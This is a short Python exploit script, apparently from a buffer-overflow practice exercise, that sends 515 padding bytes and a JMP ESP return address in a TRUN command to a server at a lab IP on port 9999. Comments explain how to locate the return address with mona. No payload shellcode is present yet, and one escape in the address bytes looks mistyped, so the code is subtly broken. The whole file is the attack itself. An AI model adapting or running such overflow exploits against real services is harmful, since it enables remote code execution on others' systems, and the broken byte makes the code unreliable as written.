#!/usr/bin/python
import sys
from socket import *

#esp return address = 311712F3

#to get this esp need to use !mona modules and after need to use !mona find -s "\xff\xe4" -m XXX.exe
#XXX.exe is file that have only False values

shellcode = "A" * 515 + "\xF3\x12\x17\31"

try: 
        s=socket(AF_INET, SOCK_STREAM)
        s.connect(('10.0.2.14', 9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close
except:
        print("Error connecting to server!")
        sys.exit()

